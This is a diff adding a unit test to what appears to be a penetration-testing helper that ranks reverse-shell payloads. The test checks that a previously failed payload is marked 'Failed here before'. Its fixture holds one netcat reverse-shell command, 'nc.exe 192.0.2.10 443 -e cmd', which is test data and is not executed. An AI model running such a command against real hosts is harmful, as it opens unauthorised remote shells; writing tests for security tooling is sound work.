@@ -195,3 +195,14 @@ describe("fit engine", () => {
     expect(ids(rankPayloads([noted], { ...base, exam: true }, null).fits)).toEqual(["noted"]);
   });
 });
+
+describe("failure memory wiring", () => {
+  it("a logged failed nc-exe entry folds nc-exe with 'Failed here before'", () => {
+    const failed: LogEntry = { ...cmdEntry("nc.exe 192.0.2.10 443 -e cmd", "Access is denied."), payloadId: "nc-exe" };
+    const { situation } = inferSituation({ host: host(), services: [], entries: [failed], examKind: false });
+    expect(situation.failedPayloadIds).toEqual(["nc-exe"]);
+    const { fits, misfits } = rankPayloads(REVERSE_SHELLS, situation, null);
+    expect(ids(fits)).not.toContain("nc-exe");
+    expect(misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Failed here before");
+  });
+});
